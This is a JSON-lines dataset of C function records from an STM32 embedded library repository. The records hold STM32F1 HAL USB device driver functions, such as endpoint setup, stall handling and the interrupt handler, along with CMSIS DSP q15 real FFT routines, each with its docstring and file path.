{"docstring": "/**\n  * @brief  Incomplete ISO OUT callbacks\n  * @param  hpcd: PCD handle\n  * @param  epnum: endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_ISOOUTIncompleteCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_ISOOUTIncompleteCallback could be implemented in the user file\n   */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Clear a STALL condition over in an endpoint\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)", "code": "{\n  PCD_EPTypeDef *ep = NULL;\n  \n  if ((0x80 & ep_addr) == 0x80)\n  {\n    ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  }\n  else\n  {\n    ep = &hpcd->OUT_ep[ep_addr];\n  }\n  \n  ep->is_stall = 0;\n  ep->num   = ep_addr & 0x7F;\n  ep->is_in = ((ep_addr & 0x80) == 0x80);\n  \n  __HAL_LOCK(hpcd); \n  USB_EPClearStall(hpcd->Instance , ep);\n  __HAL_UNLOCK(hpcd); \n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  DeInitializes the PCD peripheral \n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_DeInit(PCD_HandleTypeDef *hpcd)", "code": "{\n  /* Check the PCD handle allocation */\n  if(hpcd == NULL)\n  {\n    return HAL_ERROR;\n  }\n  \n  hpcd->State = HAL_PCD_STATE_BUSY;\n  \n  /* Stop Device */\n  HAL_PCD_Stop(hpcd);\n  \n  /* DeInit the low level hardware */\n  HAL_PCD_MspDeInit(hpcd);\n  \n  hpcd->State = HAL_PCD_STATE_RESET; \n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**    \n* @brief  Core Real IFFT process    \n* @param[in]   *pSrc \t\t\t\tpoints to the input buffer.    \n* @param[in]   fftLen  \t\t    length of FFT.   \n* @param[in]   *pATable \t\t\tpoints to the twiddle Coef A buffer.   \n* @param[in]   *pBTable \t\t\tpoints to the twiddle Coef B buffer.    \n* @param[out]  *pDst \t\t\t\tpoints to the output buffer.   \n* @param[in]   modifier \t        twiddle coefficient modifier that supports different size FFTs with the same twiddle factor table.   \n* @return none.    \n* The function implements a Real IFFT    \n*/\n", "func_signal": "void arm_split_rifft_q15(\n    q15_t * pSrc,\n    uint32_t fftLen,\n    q15_t * pATable,\n    q15_t * pBTable,\n    q15_t * pDst,\n    uint32_t modifier)", "code": "{\n    uint32_t i;                                    /* Loop Counter */\n    q31_t outR, outI;                              /* Temporary variables for output */\n    q15_t *pCoefA, *pCoefB;                        /* Temporary pointers for twiddle factors */\n    q15_t *pSrc1, *pSrc2;\n    q15_t *pDst1 = &pDst[0];\n\n    pCoefA = &pATable[0];\n    pCoefB = &pBTable[0];\n\n    pSrc1 = &pSrc[0];\n    pSrc2 = &pSrc[2u * fftLen];\n\n#ifndef ARM_MATH_CM0_FAMILY\n\n    /* Run the below code for Cortex-M4 and Cortex-M3 */\n    i = fftLen;\n\n    while(i > 0u)\n    {\n        /*    \n        outR = (pIn[2 * i] * pATable[2 * i] + pIn[2 * i + 1] * pATable[2 * i + 1] +    \n        pIn[2 * n - 2 * i] * pBTable[2 * i] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i + 1]);    \n\n        outI = (pIn[2 * i + 1] * pATable[2 * i] - pIn[2 * i] * pATable[2 * i + 1] -    \n        pIn[2 * n - 2 * i] * pBTable[2 * i + 1] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i]);    \n        */\n\n\n#ifndef ARM_MATH_BIG_ENDIAN\n\n        /* pIn[2 * n - 2 * i] * pBTable[2 * i] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i + 1]) */\n        outR = __SMUSD(*__SIMD32(pSrc2), *__SIMD32(pCoefB));\n\n#else\n\n        /* -(-pIn[2 * n - 2 * i] * pBTable[2 * i] +  \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i + 1])) */\n        outR = -(__SMUSD(*__SIMD32(pSrc2), *__SIMD32(pCoefB)));\n\n#endif /*      #ifndef ARM_MATH_BIG_ENDIAN     */\n\n        /* pIn[2 * i] * pATable[2 * i] + pIn[2 * i + 1] * pATable[2 * i + 1] +    \n        pIn[2 * n - 2 * i] * pBTable[2 * i] */\n        outR = __SMLAD(*__SIMD32(pSrc1), *__SIMD32(pCoefA), outR) >> 16u;\n\n        /*    \n        -pIn[2 * n - 2 * i] * pBTable[2 * i + 1] +    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i] */\n        outI = __SMUADX(*__SIMD32(pSrc2)--, *__SIMD32(pCoefB));\n\n        /* pIn[2 * i + 1] * pATable[2 * i] - pIn[2 * i] * pATable[2 * i + 1] */\n\n#ifndef ARM_MATH_BIG_ENDIAN\n\n        outI = __SMLSDX(*__SIMD32(pCoefA), *__SIMD32(pSrc1)++, -outI);\n\n#else\n\n        outI = __SMLSDX(*__SIMD32(pSrc1)++, *__SIMD32(pCoefA), -outI);\n\n#endif /*      #ifndef ARM_MATH_BIG_ENDIAN     */\n        /* write output */\n\n#ifndef ARM_MATH_BIG_ENDIAN\n\n        *__SIMD32(pDst1)++ = __PKHBT(outR, (outI >> 16u), 16);\n\n#else\n\n        *__SIMD32(pDst1)++ = __PKHBT((outI >> 16u), outR, 16);\n\n#endif /*      #ifndef ARM_MATH_BIG_ENDIAN     */\n\n        /* update coefficient pointer */\n        pCoefB = pCoefB + (2u * modifier);\n        pCoefA = pCoefA + (2u * modifier);\n\n        i--;\n    }\n#else\n    /* Run the below code for Cortex-M0 */\n    i = fftLen;\n\n    while(i > 0u)\n    {\n        /*    \n        outR = (pIn[2 * i] * pATable[2 * i] + pIn[2 * i + 1] * pATable[2 * i + 1] +    \n        pIn[2 * n - 2 * i] * pBTable[2 * i] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i + 1]);    \n        */\n\n        outR = *pSrc2 * *pCoefB;\n        outR = outR - (*(pSrc2 + 1) * *(pCoefB + 1));\n        outR = outR + (*pSrc1 * *pCoefA);\n        outR = (outR + (*(pSrc1 + 1) * *(pCoefA + 1))) >> 16;\n\n        /*   \n        outI = (pIn[2 * i + 1] * pATable[2 * i] - pIn[2 * i] * pATable[2 * i + 1] -   \n        pIn[2 * n - 2 * i] * pBTable[2 * i + 1] -   \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i]);   \n        */\n\n        outI = *(pSrc1 + 1) * *pCoefA;\n        outI = outI - (*pSrc1 * *(pCoefA + 1));\n        outI = outI - (*pSrc2 * *(pCoefB + 1));\n        outI = outI - (*(pSrc2 + 1) * *(pCoefB));\n\n        /* update input pointers */\n        pSrc1 += 2u;\n        pSrc2 -= 2u;\n\n        /* write output */\n        *pDst1++ = (q15_t) outR;\n        *pDst1++ = (q15_t) (outI >> 16);\n\n        /* update coefficient pointer */\n        pCoefB = pCoefB + (2u * modifier);\n        pCoefA = pCoefA + (2u * modifier);\n\n        i--;\n    }\n#endif /* #ifndef ARM_MATH_CM0_FAMILY */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\CMSIS\\DSP_Lib\\Source\\TransformFunctions\\arm_rfft_q15.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Open and configure an endpoint\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @param  ep_mps: endpoint max packet size\n  * @param  ep_type: endpoint type   \n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Open(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint16_t ep_mps, uint8_t ep_type)", "code": "{\n  HAL_StatusTypeDef  ret = HAL_OK;\n  PCD_EPTypeDef *ep = NULL;\n  \n  if ((ep_addr & 0x80) == 0x80)\n  {\n    ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  }\n  else\n  {\n    ep = &hpcd->OUT_ep[ep_addr & 0x7F];\n  }\n  ep->num   = ep_addr & 0x7F;\n  \n  ep->is_in = (0x80 & ep_addr) != 0;\n  ep->maxpacket = ep_mps;\n  ep->type = ep_type;\n    \n  __HAL_LOCK(hpcd);\n  USB_ActivateEndpoint(hpcd->Instance , ep);\n  __HAL_UNLOCK(hpcd);\n  return ret;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Data out stage callbacks\n  * @param  hpcd: PCD handle\n  * @param  epnum: endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_DataOutStageCallback could be implemented in the user file\n   */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Stop The USB Device.\n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_Stop(PCD_HandleTypeDef *hpcd)", "code": "{  \n  __HAL_LOCK(hpcd);\n  __HAL_PCD_DISABLE(hpcd);\n  USB_StopDevice(hpcd->Instance);\n  USB_DevDisconnect (hpcd->Instance);\n  __HAL_UNLOCK(hpcd);\n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Data IN stage callbacks\n  * @param  hpcd: PCD handle\n  * @param  epnum: endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_DataInStageCallback could be implemented in the user file\n   */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Incomplete ISO IN  callbacks\n  * @param  hpcd: PCD handle\n  * @param  epnum: endpoint number\n  * @retval None\n  */\n", "func_signal": "__weak void HAL_PCD_ISOINIncompleteCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)", "code": "{\n  /* Prevent unused argument(s) compilation warning */\n  UNUSED(hpcd);\n  UNUSED(epnum);\n  /* NOTE : This function should not be modified, when the callback is needed,\n            the HAL_PCD_ISOINIncompleteCallback could be implemented in the user file\n   */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Receive an amount of data\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @param  pBuf: pointer to the reception buffer\n  * @param  len: amount of data to be received\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_Receive(PCD_HandleTypeDef *hpcd, uint8_t ep_addr, uint8_t *pBuf, uint32_t len)", "code": "{\n  PCD_EPTypeDef *ep = NULL;\n  \n  ep = &hpcd->OUT_ep[ep_addr & 0x7F];\n  \n  /*setup and start the Xfer */\n  ep->xfer_buff = pBuf;  \n  ep->xfer_len = len;\n  ep->xfer_count = 0;\n  ep->is_in = 0;\n  ep->num = ep_addr & 0x7F;\n  \n  __HAL_LOCK(hpcd);\n  \n  if ((ep_addr & 0x7F) == 0 )\n  {\n    USB_EP0StartXfer(hpcd->Instance , ep);\n  }\n  else\n  {\n    USB_EPStartXfer(hpcd->Instance , ep);\n  }\n  __HAL_UNLOCK(hpcd);\n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**    \n* @brief  Core Real FFT process    \n* @param  *pSrc \t\t\t\tpoints to the input buffer.   \n* @param  fftLen  \t\t\t\tlength of FFT.   \n* @param  *pATable \t\t\tpoints to the A twiddle Coef buffer.    \n* @param  *pBTable \t\t\tpoints to the B twiddle Coef buffer.   \n* @param  *pDst \t\t\t\tpoints to the output buffer.   \n* @param  modifier \t        twiddle coefficient modifier that supports different size FFTs with the same twiddle factor table.   \n* @return none.    \n* The function implements a Real FFT    \n*/\n", "func_signal": "void arm_split_rfft_q15(\n    q15_t * pSrc,\n    uint32_t fftLen,\n    q15_t * pATable,\n    q15_t * pBTable,\n    q15_t * pDst,\n    uint32_t modifier)", "code": "{\n    uint32_t i;                                    /* Loop Counter */\n    q31_t outR, outI;                              /* Temporary variables for output */\n    q15_t *pCoefA, *pCoefB;                        /* Temporary pointers for twiddle factors */\n    q15_t *pSrc1, *pSrc2;\n#ifndef ARM_MATH_CM0_FAMILY\n    q15_t *pD1, *pD2;\n#endif\n\n    //  pSrc[2u * fftLen] = pSrc[0]; \n    //  pSrc[(2u * fftLen) + 1u] = pSrc[1]; \n\n    pCoefA = &pATable[modifier * 2u];\n    pCoefB = &pBTable[modifier * 2u];\n\n    pSrc1 = &pSrc[2];\n    pSrc2 = &pSrc[(2u * fftLen) - 2u];\n\n#ifndef ARM_MATH_CM0_FAMILY\n\n    /* Run the below code for Cortex-M4 and Cortex-M3 */\n    i = 1u;\n    pD1 = pDst + 2;\n    pD2 = pDst + (4u * fftLen) - 2;\n\n    for(i = fftLen - 1; i > 0; i--)\n    {\n        /*    \n        outR = (pSrc[2 * i] * pATable[2 * i] - pSrc[2 * i + 1] * pATable[2 * i + 1]    \n        + pSrc[2 * n - 2 * i] * pBTable[2 * i] +    \n        pSrc[2 * n - 2 * i + 1] * pBTable[2 * i + 1]);    \n        */\n\n        /* outI = (pIn[2 * i + 1] * pATable[2 * i] + pIn[2 * i] * pATable[2 * i + 1] +    \n        pIn[2 * n - 2 * i] * pBTable[2 * i + 1] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i]); */\n\n\n#ifndef ARM_MATH_BIG_ENDIAN\n\n        /* pSrc[2 * i] * pATable[2 * i] - pSrc[2 * i + 1] * pATable[2 * i + 1] */\n        outR = __SMUSD(*__SIMD32(pSrc1), *__SIMD32(pCoefA));\n\n#else\n\n        /* -(pSrc[2 * i + 1] * pATable[2 * i + 1] - pSrc[2 * i] * pATable[2 * i]) */\n        outR = -(__SMUSD(*__SIMD32(pSrc1), *__SIMD32(pCoefA)));\n\n#endif /*      #ifndef ARM_MATH_BIG_ENDIAN     */\n\n        /* pSrc[2 * n - 2 * i] * pBTable[2 * i] +    \n        pSrc[2 * n - 2 * i + 1] * pBTable[2 * i + 1]) */\n        outR = __SMLAD(*__SIMD32(pSrc2), *__SIMD32(pCoefB), outR) >> 16u;\n\n        /* pIn[2 * n - 2 * i] * pBTable[2 * i + 1] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i] */\n\n#ifndef ARM_MATH_BIG_ENDIAN\n\n        outI = __SMUSDX(*__SIMD32(pSrc2)--, *__SIMD32(pCoefB));\n\n#else\n\n        outI = __SMUSDX(*__SIMD32(pCoefB), *__SIMD32(pSrc2)--);\n\n#endif /*      #ifndef ARM_MATH_BIG_ENDIAN     */\n\n        /* (pIn[2 * i + 1] * pATable[2 * i] + pIn[2 * i] * pATable[2 * i + 1] */\n        outI = __SMLADX(*__SIMD32(pSrc1)++, *__SIMD32(pCoefA), outI);\n\n        /* write output */\n        *pD1++ = (q15_t) outR;\n        *pD1++ = outI >> 16u;\n\n        /* write complex conjugate output */\n        pD2[0] = (q15_t) outR;\n        pD2[1] = -(outI >> 16u);\n        pD2 -= 2;\n\n        /* update coefficient pointer */\n        pCoefB = pCoefB + (2u * modifier);\n        pCoefA = pCoefA + (2u * modifier);\n    }\n\n    pDst[2u * fftLen] = (pSrc[0] - pSrc[1]) >> 1;\n    pDst[(2u * fftLen) + 1u] = 0;\n\n    pDst[0] = (pSrc[0] + pSrc[1]) >> 1;\n    pDst[1] = 0;\n\n#else\n\n    /* Run the below code for Cortex-M0 */\n    i = 1u;\n\n    while(i < fftLen)\n    {\n        /*    \n        outR = (pSrc[2 * i] * pATable[2 * i] - pSrc[2 * i + 1] * pATable[2 * i + 1]    \n        + pSrc[2 * n - 2 * i] * pBTable[2 * i] +    \n        pSrc[2 * n - 2 * i + 1] * pBTable[2 * i + 1]);    \n        */\n\n        outR = *pSrc1 * *pCoefA;\n        outR = outR - (*(pSrc1 + 1) * *(pCoefA + 1));\n        outR = outR + (*pSrc2 * *pCoefB);\n        outR = (outR + (*(pSrc2 + 1) * *(pCoefB + 1))) >> 16;\n\n\n        /* outI = (pIn[2 * i + 1] * pATable[2 * i] + pIn[2 * i] * pATable[2 * i + 1] +    \n        pIn[2 * n - 2 * i] * pBTable[2 * i + 1] -    \n        pIn[2 * n - 2 * i + 1] * pBTable[2 * i]);   \n        */\n\n        outI = *pSrc2 * *(pCoefB + 1);\n        outI = outI - (*(pSrc2 + 1) * *pCoefB);\n        outI = outI + (*(pSrc1 + 1) * *pCoefA);\n        outI = outI + (*pSrc1 * *(pCoefA + 1));\n\n        /* update input pointers */\n        pSrc1 += 2u;\n        pSrc2 -= 2u;\n\n        /* write output */\n        pDst[2u * i] = (q15_t) outR;\n        pDst[(2u * i) + 1u] = outI >> 16u;\n\n        /* write complex conjugate output */\n        pDst[(4u * fftLen) - (2u * i)] = (q15_t) outR;\n        pDst[((4u * fftLen) - (2u * i)) + 1u] = -(outI >> 16u);\n\n        /* update coefficient pointer */\n        pCoefB = pCoefB + (2u * modifier);\n        pCoefA = pCoefA + (2u * modifier);\n\n        i++;\n    }\n\n    pDst[2u * fftLen] = (pSrc[0] - pSrc[1]) >> 1;\n    pDst[(2u * fftLen) + 1u] = 0;\n\n    pDst[0] = (pSrc[0] + pSrc[1]) >> 1;\n    pDst[1] = 0;\n\n#endif /* #ifndef ARM_MATH_CM0_FAMILY */\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\CMSIS\\DSP_Lib\\Source\\TransformFunctions\\arm_rfft_q15.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Disconnect the USB device\n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_DevDisconnect(PCD_HandleTypeDef *hpcd)", "code": "{\n  __HAL_LOCK(hpcd);\n  HAL_PCDEx_SetConnectionState (hpcd, 0);\n  USB_DevDisconnect(hpcd->Instance);\n  __HAL_UNLOCK(hpcd);\n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Set a STALL condition over an endpoint\n  * @param  hpcd: PCD handle\n  * @param  ep_addr: endpoint address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_EP_SetStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)", "code": "{\n  PCD_EPTypeDef *ep = NULL;\n  \n  if ((0x80 & ep_addr) == 0x80)\n  {\n    ep = &hpcd->IN_ep[ep_addr & 0x7F];\n  }\n  else\n  {\n    ep = &hpcd->OUT_ep[ep_addr];\n  }\n  \n  ep->is_stall = 1;\n  ep->num   = ep_addr & 0x7F;\n  ep->is_in = ((ep_addr & 0x80) == 0x80);\n  \n  __HAL_LOCK(hpcd);\n  USB_EPSetStall(hpcd->Instance , ep);\n  if((ep_addr & 0x7F) == 0)\n  {\n    USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);\n  }\n  __HAL_UNLOCK(hpcd); \n  \n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  This function handles PCD Endpoint interrupt request.\n  * @param  hpcd: PCD handle\n  * @retval HAL status\n  */\n", "func_signal": "static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)", "code": "{\n  PCD_EPTypeDef *ep = NULL;\n  uint16_t count = 0;\n  uint8_t epindex = 0;\n  __IO uint16_t wIstr = 0;  \n  __IO uint16_t wEPVal = 0;\n  \n  /* stay in loop while pending interrupts */\n  while (((wIstr = hpcd->Instance->ISTR) & USB_ISTR_CTR) != 0)\n  {\n    /* extract highest priority endpoint number */\n    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);\n    \n    if (epindex == 0)\n    {\n      /* Decode and service control endpoint interrupt */\n      \n      /* DIR bit = origin of the interrupt */   \n      if ((wIstr & USB_ISTR_DIR) == 0)\n      {\n        /* DIR = 0 */\n        \n        /* DIR = 0      => IN  int */\n        /* DIR = 0 implies that (EP_CTR_TX = 1) always  */\n        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);\n        ep = &hpcd->IN_ep[0];\n        \n        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);\n        ep->xfer_buff += ep->xfer_count;\n \n        /* TX COMPLETE */\n        HAL_PCD_DataInStageCallback(hpcd, 0);\n        \n        \n        if((hpcd->USB_Address > 0)&& ( ep->xfer_len == 0))\n        {\n          hpcd->Instance->DADDR = (hpcd->USB_Address | USB_DADDR_EF);\n          hpcd->USB_Address = 0;\n        }\n        \n      }\n      else\n      {\n        /* DIR = 1 */\n        \n        /* DIR = 1 & CTR_RX       => SETUP or OUT int */\n        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */\n        ep = &hpcd->OUT_ep[0];\n        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);\n        \n        if ((wEPVal & USB_EP_SETUP) != 0)\n        {\n          /* Get SETUP Packet*/\n          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);\n          USB_ReadPMA(hpcd->Instance, (uint8_t*)hpcd->Setup ,ep->pmaadress , ep->xfer_count);       \n          /* SETUP bit kept frozen while CTR_RX = 1*/ \n          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0); \n          \n          /* Process SETUP Packet*/\n          HAL_PCD_SetupStageCallback(hpcd);\n        }\n        \n        else if ((wEPVal & USB_EP_CTR_RX) != 0)\n        {\n          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);\n          /* Get Control Data OUT Packet*/\n          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);\n          \n          if (ep->xfer_count != 0)\n          {\n            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, ep->xfer_count);\n            ep->xfer_buff+=ep->xfer_count;\n          }\n          \n          /* Process Control Data OUT Packet*/\n           HAL_PCD_DataOutStageCallback(hpcd, 0);\n          \n          PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);\n          PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);\n        }\n      }\n    }\n    else\n    {\n      /* Decode and service non control endpoints interrupt  */\n\t  \n      /* process related endpoint register */\n      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);\n      if ((wEPVal & USB_EP_CTR_RX) != 0)\n      {  \n        /* clear int flag */\n        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);\n        ep = &hpcd->OUT_ep[epindex];\n        \n        /* OUT double Buffering*/\n        if (ep->doublebuffer == 0)\n        {\n          count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);\n          if (count != 0)\n          {\n            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);\n          }\n        }\n        else\n        {\n          if (PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX)\n          {\n            /*read from endpoint BUF0Addr buffer*/\n            count = PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);\n            if (count != 0)\n            {\n              USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);\n            }\n          }\n          else\n          {\n            /*read from endpoint BUF1Addr buffer*/\n            count = PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);\n            if (count != 0)\n            {\n              USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);\n            }\n          }\n          PCD_FreeUserBuffer(hpcd->Instance, ep->num, PCD_EP_DBUF_OUT);  \n        }\n        /*multi-packet on the NON control OUT endpoint*/\n        ep->xfer_count+=count;\n        ep->xfer_buff+=count;\n       \n        if ((ep->xfer_len == 0) || (count < ep->maxpacket))\n        {\n          /* RX COMPLETE */\n          HAL_PCD_DataOutStageCallback(hpcd, ep->num);\n        }\n        else\n        {\n          HAL_PCD_EP_Receive(hpcd, ep->num, ep->xfer_buff, ep->xfer_len);\n        }\n        \n      } /* if((wEPVal & EP_CTR_RX) */\n      \n      if ((wEPVal & USB_EP_CTR_TX) != 0)\n      {\n        ep = &hpcd->IN_ep[epindex];\n        \n        /* clear int flag */\n        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);\n        \n        /* IN double Buffering*/\n        if (ep->doublebuffer == 0)\n        {\n          ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);\n          if (ep->xfer_count != 0)\n          {\n            USB_WritePMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, ep->xfer_count);\n          }\n        }\n        else\n        {\n          if (PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_TX)\n          {\n            /*read from endpoint BUF0Addr buffer*/\n            ep->xfer_count = PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);\n            if (ep->xfer_count != 0)\n            {\n              USB_WritePMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, ep->xfer_count);\n            }\n          }\n          else\n          {\n            /*read from endpoint BUF1Addr buffer*/\n            ep->xfer_count = PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);\n            if (ep->xfer_count != 0)\n            {\n              USB_WritePMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, ep->xfer_count);\n            }\n          }\n          PCD_FreeUserBuffer(hpcd->Instance, ep->num, PCD_EP_DBUF_IN);  \n        }\n        /*multi-packet on the NON control IN endpoint*/\n        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);\n        ep->xfer_buff+=ep->xfer_count;\n       \n        /* Zero Length Packet? */\n        if (ep->xfer_len == 0)\n        {\n          /* TX COMPLETE */\n          HAL_PCD_DataInStageCallback(hpcd, ep->num);\n        }\n        else\n        {\n          HAL_PCD_EP_Transmit(hpcd, ep->num, ep->xfer_buff, ep->xfer_len);\n        }\n      } \n    }\n  }\n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
{"docstring": "/**\n  * @brief  Set the USB Device address\n  * @param  hpcd: PCD handle\n  * @param  address: new device address\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_PCD_SetAddress(PCD_HandleTypeDef *hpcd, uint8_t address)", "code": "{\n  __HAL_LOCK(hpcd);\n  hpcd->USB_Address = address;\n  USB_SetDevAddress(hpcd->Instance, address);\n  __HAL_UNLOCK(hpcd);\n  return HAL_OK;\n}", "path": "HAL\\ssd1306\\ssd1306\\Drivers\\STM32F1xx_HAL_Driver\\Src\\stm32f1xx_hal_pcd.c", "repo_name": "SL-RU/stm32libs", "stars": 132, "license": "None", "language": "c", "size": 4441}
